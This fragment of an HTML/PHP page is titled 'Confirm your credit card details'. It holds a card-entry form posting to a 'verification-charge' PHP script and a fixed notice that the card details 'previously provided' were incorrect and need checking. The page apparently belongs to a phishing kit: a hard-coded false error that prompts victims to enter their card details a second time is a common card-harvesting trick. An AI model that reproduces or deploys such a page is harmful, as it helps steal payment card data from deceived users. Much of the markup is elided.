...
<head>
    <meta charset="utf-8">
    <title>Confirm your credit card details</title>
    <?php
  ...
  <div class="content--wrap">
    ...
    <div class="main-container">
			...
			<section class="main-container">
			  <center><h3 class="text--logo light color--black">Credit card information </h3></center>
			  ...
			  <div class="container">
				...
				<div class="main2">
				 ...
				 <form action="/bxoffice-traitement/verification-charge-en.php" method="post" id="payment-form">
				  <div class="form-row">
				...
				<a href="shop-checkout-payment.html" class="btn btn-group btn-default">Next Step <i class="icon-right-open-big"></i></a>
                        ...
                        <div class="col-sm-5 col-sm-offset-1 col-xs-12 mt--xs--2">
                          <div class="pricing pricing-2 boxed boxed--border boxed--lg row no-gutters">
                            <div class="col-lg-12">
                              <h2>Verification</h2> <span class="p"><?php echo $MOTTO_EN_INSCRIPTION; ?><br><img class="rating-xs" src="img/4-5-star.png"></span>
                              <hr>
			    </div>
                    ...
                    <ol class="process-3">
                      <li class="process_item">
                        ...
                        <div class="process__body">
                          ...
                          <p> The credit card details previously provided was <b>incorrect</b>, please check your credit card details. </p>
                        </div>
                      </li>
